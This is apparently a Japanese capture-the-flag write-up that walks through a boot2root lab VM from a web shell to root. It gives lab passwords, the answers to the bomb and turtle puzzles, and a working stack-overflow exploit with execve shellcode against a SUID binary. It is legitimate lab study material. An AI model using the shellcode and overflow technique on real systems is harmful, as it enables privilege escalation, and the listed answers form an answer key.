# Boot2root - Writeup 2 (lmezard 〜 laurie)

## 1. ユーザー lmezard への侵入

### 認証情報の発見
Web Shell (`www-data`) 権限でサーバー内を探索したところ、`/home/LOOKATME/password` に以下の記述を発見した。

```text
lmezard:G!@M6f4Eatau{sF"
```

### SSH/コンソールログイン
このパスワードを使用して `lmezard` ユーザーとしてログインに成功した。

## 2. ユーザー laurie への昇格

### ft_fun チャレンジ
`lmezard` のホームディレクトリに `fun` という tar アーカイブと `README` が存在した。
`README` には「このチャレンジをクリアして結果を `laurie` の SSH パスワードとして使用せよ」との指示があった。

1.  **ファイルの展開:** `tar -xf fun` により `ft_fun/` ディレクトリが生成された。
2.  **構造の解析:** ディレクトリ内には大量の `.pcap` ファイルがあり、各ファイルに C 言語の断片と `//fileXXX` という形式の順序を示すコメントが含まれていた。
3.  **コマンドによる自動復元:** 以下のパイプラインを実行し、番号順にファイルを抽出・結合してソースコードを復元した。
    ```bash
    # 順序マーカーを抽出 -> 番号順にソート -> ファイル名のみ抽出 -> 結合
    grep -r "//file" ft_fun | sed 's/\(.*\):\/\/file\([0-9]*\)/\2 \1/' | sort -n | awk '{print $2}' | xargs cat > reconstructed.c
    
    # ソースコード内のマーカーを削除
    sed -i 's/\/\/file[0-9]*//g' reconstructed.c
    ```
4.  **パスワードの特定:** 復元したコードをコンパイル・実行した。
    ```bash
    gcc reconstructed.c -o solution && ./solution
    # 出力: MY PASSWORD IS: Iheartpwnage
    #      Now SHA-256 it and submit
    ```
5.  **ハッシュ化:** `Iheartpwnage` を指示通り SHA-256 でハッシュ化した。
    ```bash
    echo -n "Iheartpwnage" | sha256sum
    # 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
    ```

このハッシュ値をパスワードとして、`laurie` ユーザーでの SSH ログインに成功した。

## 3. ユーザー thor への道（Binary Bomb）

### bomb の解析
`laurie` のホームディレクトリに `bomb` という実行ファイルが存在する。これをリバースエンジニアリングして各フェーズの回答を特定した。

*   **Phase 1:** `Public speaking is very easy.`
*   **Phase 2:** `1 2 6 24 120 720`
*   **Phase 3:** `1 b 214` (Case 1)
*   **Phase 4:** `9`
*   **Phase 5:** `opekma` (変換後に `giants` となる文字列)
*   **Phase 6:** `4 2 6 3 1 5`
*   **Secret Phase:** `1001`

### SSH ログイン
`README` のヒント `P 2 b o 4` に従い、各回答を連結したものがパスワードとなっていた。
(実際には `bomb` を解くことで `thor` への道が開ける)

## 4. ユーザー zaz への昇格（Turtle Challenge）

### turtle チャレンジ
`thor` のホームディレクトリに `turtle` というファイルと、指示が書かれた `README` があった。
`turtle` ファイルにはフランス語によるタートルグラフィックスの命令（Avance, Tourne gauche 等）が大量に記述されていた。

1.  **描画の解析:** 命令に従って図形を描画すると、文字が浮かび上がる。
2.  **キーワードの特定:** 全ての命令を解析した結果、描画される単語は **`SLASH`** であった。
3.  **パスワードの生成:** `README` の "Can you digest the message?" というヒントから、`SLASH` の MD5 ハッシュを計算した。
    ```bash
    echo -n "SLASH" | md5sum
    # 646da671ca01bb5d84dbb5fb2238dc8e
    ```

このハッシュ値をパスワードとして、`zaz` ユーザーでのログインに成功した。

## 5. Root 権限の奪取（exploit_me）

### バイナリ解析
`zaz` のホームディレクトリに SUID 設定されたバイナリ `exploit_me` が存在した。
ソースを調査したところ、`strcpy` 関数を使用した典型的な **Buffer Overflow (BoF)** の脆弱性があった。

*   **ASLR:** 無効 (`/proc/sys/kernel/randomize_va_space` が 0)
*   **NX:** 無効 (スタックが実行可能)

### エクスプロイトの実行
スタックのアドレスが固定されており、実行可能であるため、スタック上にシェルコードを配置してリターンアドレスを書き換える攻撃を行った。

1.  **オフセット特定:** 140バイトの後にリターンアドレスがあることを特定。
2.  **ペイロード構成:** `[NOP Slide] + [Shellcode] + [Stack Address]`
3.  **実行コマンド:**
    ```bash
    ./exploit_me $(python -c "print('\x90'*100 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + 'A'*(140-100-23) + '\x60\xfc\xff\xbf')")
    ```

この結果、root 権限 (euid=0) を獲得し、システムを完全に支配下に置いた。

---
**結論:**
Webの脆弱性から侵入し、各ユーザーのチャレンジ（アーカイブ復元、バイナリ爆弾、タートルグラフィックス）を順番に突破。最後に古典的なスタックベースのバッファオーバーフローを利用して Root 権限を取得した。
